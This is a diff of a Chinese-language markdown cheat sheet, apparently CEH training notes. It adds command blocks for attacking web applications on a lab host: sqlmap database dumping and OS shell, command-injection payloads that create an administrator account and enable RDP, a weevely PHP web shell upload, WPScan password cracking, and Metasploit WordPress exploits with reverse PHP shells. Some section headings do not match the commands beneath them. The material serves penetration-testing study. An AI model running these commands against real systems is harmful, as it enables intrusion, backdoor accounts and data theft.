@@ -59,16 +59,94 @@
 
 ### 掃描與攻擊網頁程式
 
+- 參數串改攻擊
 <details>
-  <summary>參數串改攻擊</summary>
+  <summary>MSSQL隱碼攻擊</summary>
 
   ```console
   sqlmap -u "url" --cookie="<cookie>" 
   sqlmap -u "url" --cookie="<cookie>" --dbs 
   sqlmap -u "url" --cookie="<cookie>" -D dbname --tables 
   sqlmap -u "url" --cookie="<cookie>" -D dbname -T users -dump
-  sqlmap -u "url" --cookie="<cookie>" -D dbname -T Login --columns --technique=B 
-  sqlmap -u "url" --cookie="<cookie>" -D dbname -T Login -dump --technique=B 
+  sqlmap -u "url" --cookie="<cookie>" -D dbname -T users --columns --technique=B 
+  sqlmap -u "url" --cookie="<cookie>" -D dbname -T users -dump --technique=B 
   sqlmap -u "url" --cookie="<cookie>" --os-shell
+  ```
+</details>
+
+- MySQL盲隱碼攻擊
+
+<details>
+  <summary>命令注入攻擊</summary>
+
+  ```console
+  | whoami
+  | net user cehp /add
+  | net users
+  | net localgroup Administrators cehp /add
+  | net localgroup Administrators
+  | reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+  | netstat -an | findstr :3389
+  ```
+</details>
+
+<details>
+  <summary>Webshell上傳攻擊</summary>
+
+  ```console
+  weevely generate cehp backdoor.php
+  weevely http://10.10.10.16:8080/dvwa/hackable/uploads/backdoor.php cehp
+  whoami
+  ```
+</details>
+
+<details>
+  <summary>利用WPScan破解WordPress使用者密碼</summary>
+
+  ```console
+  whatweb http://10.10.10.16:8080/ceh
+  wpscan --url http://10.10.10.16:8080/ceh -e u
+  wpscan --url http://10.10.10.16:8080/ceh -P /usr/share/wordlists/nmap.lst
+  ```
+</details>
+
+<details>
+  <summary>利用Metasploit攻擊WordPress網站</summary>
+
+  ```console
+  sudo service postgresql start
+  msfconsole
+  use exploit/unix/webapp/wp_admin_shell_upload
+  show info
+  set rhosts 10.10.10.16
+  set rport 8080
+  set targeturi /ceh
+  set username admin
+  set password qwerty@123
+  set payload php/reverse_php
+  exploit
+  whoami
+  ```
+</details>
+
+- 安裝WordPress
+
+<details>
+  <summary>利用外掛漏洞攻擊WordPress網站</summary>
+
+  ```console
+  wpscan --url http://10.10.10.16:8080/ceh
+  sudo service postgresql start
+  msfconsole
+  use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload
+  show info
+  set rhosts 10.10.10.16
+  set rport 8080
+  set targeturi /ceh
+  set username cehuser1
+  set password green
+  set payload php/reverse_php
+  exploit
+  whoami
   ```
 </details>
